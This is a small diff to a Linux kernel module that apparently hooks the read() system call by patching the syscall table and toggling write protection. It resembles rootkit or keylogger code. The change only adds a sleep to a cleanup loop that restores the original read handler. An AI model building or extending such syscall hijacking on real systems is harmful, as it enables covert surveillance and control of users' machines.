@@ -9,7 +9,7 @@
 #include<linux/fdtable.h>
 #include<linux/dcache.h>
 #include<linux/hash.h>
-
+#include<linux/delay.h>
 
 #include "hooking.h"
 #include "commands.h"
@@ -297,7 +297,8 @@ void stop_listen(void){
 	syscall_table[__NR_read] = orig_sys_read;
 	enable_wp();
   	while(rcount>0){// hack to unblock read
-    		printk(KERN_INFO "\n");
-  	}
+      msleep_interruptible(100);
+    	printk(KERN_INFO "\n");
+  }
 }
 
